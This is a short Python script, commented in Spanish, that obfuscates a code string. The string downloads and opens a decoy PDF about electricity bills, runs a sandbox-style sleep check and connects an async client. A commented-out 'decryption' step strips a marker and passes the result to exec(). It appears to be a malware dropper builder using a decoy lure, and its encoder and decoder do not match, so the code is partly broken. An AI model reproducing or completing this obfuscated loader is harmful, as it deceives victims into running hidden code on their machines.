
# Algoritmo de cifrado
code = '''
def getImageAndSave():
    response = requests.get('https://urra.com.co/wp-content/uploads/2021/02/Todo-lo-que-debe-saber-sobre-la-factura-de-energia-electrica-CREG.pdf')
    if( response.status_code == 200):

        with open("pdf.pdf", "wb") as file:
                file.write(response.content)
    else:
        print(f"Error al descargar la imagen: {response.status_code}")    

    os.startfile('pdf.pdf')

if __name__ == "__main__":
    getImageAndSave()
    client = AsyncClient()
    check_sleep_integrity()
    asyncio.run(client.connect())
'''

data = ""
for i in code:
    if i != "":
        data += i + "77777777777777777777"
    else:
        data = ""
print(data)


# # Algoritmo de descifrado
# if data.find("1gret2"):
#     datareplace = data.replace("1gret2","")
#     print(datareplace)

# exec(datareplace)